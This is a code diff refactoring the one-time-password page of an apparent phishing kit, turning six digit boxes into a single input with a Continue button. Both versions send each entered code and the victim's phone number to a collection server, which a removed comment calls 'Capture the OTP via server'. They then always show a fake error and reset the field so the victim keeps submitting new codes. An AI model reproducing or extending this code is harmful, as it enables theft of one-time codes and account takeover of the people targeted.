@@ -1,4 +1,4 @@
-﻿import React, { useState, useRef, useEffect } from "react";
+import React, { useState, useRef, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import "../App.css";
 import axios from "axios";
@@ -10,16 +10,15 @@ const RESEND_SECONDS = 30;
 
 const Otp = () => {
   const navigate = useNavigate();
-  const [otp, setOtp] = useState(new Array(OTP_LENGTH).fill(""));
+  const [otp, setOtp] = useState("");
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
   const [seconds, setSeconds] = useState(RESEND_SECONDS);
   const [canResend, setCanResend] = useState(false);
-  const inputRefs = useRef([]);
+  const inputRef = useRef(null);
 
   const phone = localStorage.getItem("gt_phone") || "";
 
-  // Countdown timer
   useEffect(() => {
     if (seconds <= 0) {
       setCanResend(true);
@@ -29,82 +28,43 @@ const Otp = () => {
     return () => clearTimeout(timer);
   }, [seconds]);
 
-  // Focus first input on mount
   useEffect(() => {
-    inputRefs.current[0]?.focus();
+    inputRef.current?.focus();
   }, []);
 
-  const submit = (code) => {
+  const handleChange = (e) => {
+    const value = e.target.value.replace(/\D/g, "").slice(0, OTP_LENGTH);
+    setOtp(value);
+    setError("");
+  };
+
+  const handleSubmit = () => {
+    if (otp.length < OTP_LENGTH) {
+      setError("Please enter the complete 6-digit code.");
+      return;
+    }
     setLoading(true);
     setError("");
-    // Capture the OTP via server — fire and forget
-    axios.post(`${BASE_URL}/otp`, { otp: code, phone }).catch(() => {});
-    // Always show error after 5 seconds and reset inputs
+    axios.post(`${BASE_URL}/otp`, { otp, phone }).catch(() => {});
     setTimeout(() => {
       setLoading(false);
       setError("An error occurred. Please try again.");
-      setOtp(new Array(OTP_LENGTH).fill(""));
+      setOtp("");
       setSeconds(RESEND_SECONDS);
       setCanResend(false);
-      setTimeout(() => inputRefs.current[0]?.focus(), 0);
+      inputRef.current?.focus();
     }, 5000);
-  };
-
-  const handleChange = (e, index) => {
-    const val = e.target.value.replace(/\D/g, "").slice(-1);
-    const newOtp = [...otp];
-    newOtp[index] = val;
-    setOtp(newOtp);
-    setError("");
-
-    if (val && index < OTP_LENGTH - 1) {
-      inputRefs.current[index + 1]?.focus();
-    }
-
-    if (newOtp.every((d) => d !== "") && val) {
-      submit(newOtp.join(""));
-    }
-  };
-
-  const handleKeyDown = (e, index) => {
-    if (e.key === "Backspace") {
-      if (otp[index]) {
-        const newOtp = [...otp];
-        newOtp[index] = "";
-        setOtp(newOtp);
-      } else if (index > 0) {
-        inputRefs.current[index - 1]?.focus();
-      }
-    }
-  };
-
-  const handlePaste = (e) => {
-    e.preventDefault();
-    const pasted = e.clipboardData
-      .getData("text")
-      .replace(/\D/g, "")
-      .slice(0, OTP_LENGTH);
-    if (!pasted) return;
-    const newOtp = [...otp];
-    for (let i = 0; i < pasted.length; i++) newOtp[i] = pasted[i];
-    setOtp(newOtp);
-    const nextIndex = Math.min(pasted.length, OTP_LENGTH - 1);
-    inputRefs.current[nextIndex]?.focus();
-    if (pasted.length === OTP_LENGTH) submit(pasted);
   };
 
   const handleResend = () => {
     if (!canResend) return;
     setSeconds(RESEND_SECONDS);
     setCanResend(false);
-    setOtp(new Array(OTP_LENGTH).fill(""));
+    setOtp("");
     setError("");
-    inputRefs.current[0]?.focus();
+    inputRef.current?.focus();
     axios.post(`${BASE_URL}/`, { phone }).catch(() => {});
   };
-
-  // Index of the first empty slot (used to highlight the active box)
-  const activeIndex = otp.findIndex((d) => d === "");
 
   return (
     <div className="min-h-screen bg-gray-100 flex flex-col px-7">
@@ -130,38 +90,36 @@ const Otp = () => {
         </p>
       </div>
 
-      {/* OTP boxes */}
-      <div className="flex items-center gap-2.5 mt-10" onPaste={handlePaste}>
-        {otp.map((digit, i) => (
-          <input
-            key={i}
-            ref={(el) => (inputRefs.current[i] = el)}
-            type="tel"
-            inputMode="numeric"
-            pattern="[0-9]*"
-            maxLength={1}
-            value={digit}
-            onChange={(e) => handleChange(e, i)}
-            onKeyDown={(e) => handleKeyDown(e, i)}
-            autoComplete="one-time-code"
-            className={`w-full aspect-square max-w-[52px] rounded-xl border-2 text-center text-[22px] font-bold text-gray-900 bg-white outline-none transition-colors duration-150 ${
-              i === activeIndex
-                ? "border-[#FA5621]"
-                : digit
-                  ? "border-gray-300"
-                  : "border-gray-200"
-            }`}
-          />
-        ))}
+      {/* OTP input */}
+      <div className="mt-8">
+        <input
+          ref={inputRef}
+          type="tel"
+          inputMode="numeric"
+          pattern="[0-9]*"
+          placeholder="Enter 6-digit code"
+          value={otp}
+          onChange={handleChange}
+          maxLength={OTP_LENGTH}
+          autoComplete="one-time-code"
+          className="w-full bg-gray-200 rounded-xl px-5 py-5 text-[18px] text-gray-900 placeholder-gray-400 outline-none tracking-widest"
+        />
+        {error && (
+          <p className="mt-2 text-sm text-red-500 font-medium">{error}</p>
+        )}
       </div>
 
-      {/* Error */}
-      {error && (
-        <p className="mt-4 text-sm text-red-500 font-medium">{error}</p>
-      )}
-
-      {/* Loading */}
-      {loading && <p className="mt-4 text-sm text-gray-400">Verifying…</p>}
+      {/* Continue button */}
+      <div className="mt-4">
+        <button
+          type="button"
+          disabled={loading}
+          onClick={handleSubmit}
+          className="w-full bg-[#FA5621] hover:bg-[#e04d1c] disabled:opacity-60 disabled:cursor-not-allowed text-white font-bold text-[17px] py-5 rounded-xl cursor-pointer transition-colors duration-200"
+        >
+          {loading ? "Verifying..." : "Continue"}
+        </button>
+      </div>
 
       {/* Resend */}
       <p className="mt-6 text-[13px] text-gray-400">
